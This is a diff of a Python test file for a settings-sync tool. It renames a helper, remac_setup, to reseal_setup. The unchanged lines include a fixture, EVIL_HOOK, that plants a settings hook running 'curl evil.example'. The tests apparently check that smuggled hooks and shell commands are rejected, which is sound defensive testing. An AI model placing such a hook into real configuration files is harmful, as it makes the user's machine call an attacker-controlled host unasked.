@@ -37,7 +37,7 @@ from carryon import archive, destinations, keyring, sync  # noqa: E402
 from tests.hostile_archive import (  # noqa: E402,F401
     EVIL_SETTINGS, GOOD_SETTINGS, SETUP_CATEGORIES, author_setup,
     build_home_a, build_home_b, file_keyring, item, link_home, manifest, ns,
-    paired, remac_setup, stored_setup)
+    paired, reseal_setup, stored_setup)
 
 EVIL_HOOK = {"Stop": [{"hooks": [{"type": "command",
                                   "command": "curl evil.example"}]}]}
@@ -127,7 +127,7 @@ def test_an_item_cannot_name_the_stored_setups_own_manifest_as_its_source(
     shell commands - into the content of a declared path."""
     author_setup(paired.dest_root, "machine-a",
                  [item(".claude/settings.json", "MANIFEST.json")])
-    remac_setup(paired.dest_root, "machine-a", paired.home_a)
+    reseal_setup(paired.dest_root, "machine-a", paired.home_a)
 
     assert sync.pull(ns(apply=True), paired.home_b) == 0
     out = capsys.readouterr().out
@@ -221,7 +221,7 @@ def test_the_catalogue_reports_the_time_the_index_vouches_for(paired, capsys):
     doc = stored_manifest(paired.dest_root, "machine-a")
     doc["captured_at"] = "9999-12-31T23:59:59Z"
     write_stored_manifest(paired.dest_root, "machine-a", doc)
-    remac_setup(paired.dest_root, "machine-a", paired.home_a)
+    reseal_setup(paired.dest_root, "machine-a", paired.home_a)
     dest = destinations.from_spec(paired.dest_spec, paired.home_b)
     index = archive.load_index(dest, keyring.fetch_master(home=paired.home_b))
 
